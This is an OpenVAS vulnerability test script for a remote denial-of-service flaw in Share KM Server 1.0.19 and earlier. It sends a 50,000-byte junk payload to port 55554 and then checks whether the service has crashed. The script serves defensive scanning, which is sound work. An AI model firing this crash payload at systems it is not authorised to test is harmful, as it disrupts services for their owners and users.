###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sharekm_server_dos_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
#
# Share KM Server Remote Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803762");
  script_version("$Revision: 11421 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-09-23 15:05:45 +0530 (Mon, 23 Sep 2013)");
  script_name("Share KM Server Remote Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(55554);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/28451");

  script_tag(name:"summary", value:"This host is running Share KM Server and is prone to denial of service
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted request and check is it vulnerable to DoS or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling specially crafted requests which can
  be exploited to crash the server.");

  script_tag(name:"affected", value:"Share KM versions 1.0.19 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to cause a denial of service.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

frcviPort = 55554;
if(!get_port_state(frcviPort)){
  exit(0);
}

soc = open_sock_tcp(frcviPort);
if(!soc){
  exit(0);
}

send(socket:soc, data:"GET / HTTP1.1\r\n");
recv = recv(socket:soc, length:1024);
if(!recv)
{
  close(soc);
  exit(0);
}

req = crap(data: "A", length:50000);

send(socket:soc, data:req);
close(soc);

sleep(2);

soc = open_sock_tcp(frcviPort);
if(!soc)
{
  security_message(frcviPort);
  exit(0);
}
else
{
  send(socket:soc, data:"GET / HTTP1.1\r\n");
  recv = recv(socket:soc, length:1024);
  if(!recv)
  {
   close(soc);
   security_message(frcviPort);
   exit(0);

  }
  close(soc);
}
